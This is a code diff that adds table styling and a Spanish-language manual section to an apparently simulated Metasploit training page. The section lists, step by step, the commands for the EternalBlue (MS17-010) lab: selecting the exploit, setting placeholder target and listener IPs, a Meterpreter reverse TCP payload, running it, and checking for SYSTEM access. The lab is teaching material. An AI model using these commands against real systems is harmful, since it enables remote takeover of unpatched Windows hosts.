@@ -100,6 +100,9 @@ main.tabpanel[hidden]{display:none;}
   color:var(--green); background:rgba(57,255,106,.07); padding:1px 5px; border-radius:3px; font-size:12px;
 }
 .manual-body li code{color:var(--text);}
+.manual-body table{width:100%; border-collapse:collapse; margin:10px 0; font-size:12px;}
+.manual-body th, .manual-body td{padding:8px 10px; border:1px solid var(--line); text-align:left; vertical-align:top; line-height:1.5;}
+.manual-body th{color:var(--green); font-size:11px; text-transform:uppercase; letter-spacing:1px;}
 .manual-body .warnbox{
   border:1px solid rgba(255,180,0,.4); color:var(--amber); border-radius:4px;
   padding:10px 14px; margin:14px 0; font-size:12px; line-height:1.6;
@@ -241,6 +244,28 @@ main.tabpanel[hidden]{display:none;}
       <li>Laboratorios legales: Metasploitable 2/3, Hack The Box, TryHackMe, VulnHub.</li>
       <li>Repositorio y changelog: github.com/rapid7/metasploit-framework.</li>
     </ul>
+
+    <h2>11. Comandos del laboratorio — guía paso a paso</h2>
+    <p>Lista exacta de comandos para completar el laboratorio EternalBlue de la pestaña «Laboratorio», en orden, con el prompt que verás en cada etapa y la salida esperada.</p>
+    <table>
+      <tr><th>#</th><th>Prompt</th><th>Comando</th><th>Qué hace / salida esperada</th></tr>
+      <tr><td>1</td><td><code>msf6 &gt;</code></td><td><code>search eternalblue</code></td><td>Busca el módulo en la base de datos. Debe aparecer <code>exploit/windows/smb/ms17_010_eternalblue</code> (rank: average).</td></tr>
+      <tr><td>2</td><td><code>msf6 &gt;</code></td><td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td><td>Selecciona el exploit. El prompt cambia a <code>msf6 exploit(ms17_010_eternalblue) &gt;</code>. (También vale <code>use 0</code>, el número que devolvió la búsqueda.)</td></tr>
+      <tr><td>3</td><td><code>msf6 exploit(...) &gt;</code></td><td><code>set RHOSTS 192.0.2.10</code></td><td>Fija el objetivo ficticio (IP de documentación RFC 5737). Salida: <code>RHOSTS =&gt; 192.0.2.10</code>.</td></tr>
+      <tr><td>4</td><td><code>msf6 exploit(...) &gt;</code></td><td><code>set LHOST 192.0.2.50</code></td><td>Fija tu IP (listener de la reverse shell). Salida: <code>LHOST =&gt; 192.0.2.50</code>.</td></tr>
+      <tr><td>5</td><td><code>msf6 exploit(...) &gt;</code></td><td><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></td><td>Configura el payload Meterpreter de conexión inversa para Windows x64.</td></tr>
+      <tr><td>6</td><td><code>msf6 exploit(...) &gt;</code></td><td><code>exploit</code></td><td>Lanza el exploit (también vale <code>run</code>). Verás el handler TCP en 4444, el envío del stage y <code>Meterpreter session 1 opened</code>. El prompt cambia a <code>meterpreter &gt;</code>.</td></tr>
+      <tr><td>7</td><td><code>meterpreter &gt;</code></td><td><code>getuid</code></td><td>Muestra el usuario de la sesión: <code>Server username: NT AUTHORITY\SYSTEM</code> (acceso máximo en Windows).</td></tr>
+      <tr><td>8</td><td><code>meterpreter &gt;</code></td><td><code>sysinfo</code></td><td>Información del equipo comprometido: <code>LAB-WIN2016</code>, Windows Server 2016 x64, idioma es_ES.</td></tr>
+      <tr><td>9</td><td><code>meterpreter &gt;</code></td><td><code>exit</code></td><td>Cierra limpiamente la sesión (también valen <code>background</code> o <code>bg</code>). Con esto el laboratorio queda completado.</td></tr>
+    </table>
+    <h3>Comandos de apoyo en cualquier momento</h3>
+    <ul>
+      <li><code>help</code> — lista los comandos válidos en la etapa actual (root, módulo o meterpreter).</li>
+      <li><code>pista</code> o el botón «pista» — te recuerda el objetivo actual.</li>
+      <li><code>clear</code> — limpia la consola; <code>reset</code> o el botón «reiniciar» — vuelve al paso 1.</li>
+    </ul>
+    <div class="warnbox">Notas: los comandos aceptan mayúsculas/minúsculas indistintamente y <code>set rhosts</code>/<code>set rhost</code> ambos valen. En Metasploit real añadirías <code>show options</code> antes de explotar y <code>check</code> para validar la vulnerabilidad.</div>
   </div>
 </main>
 
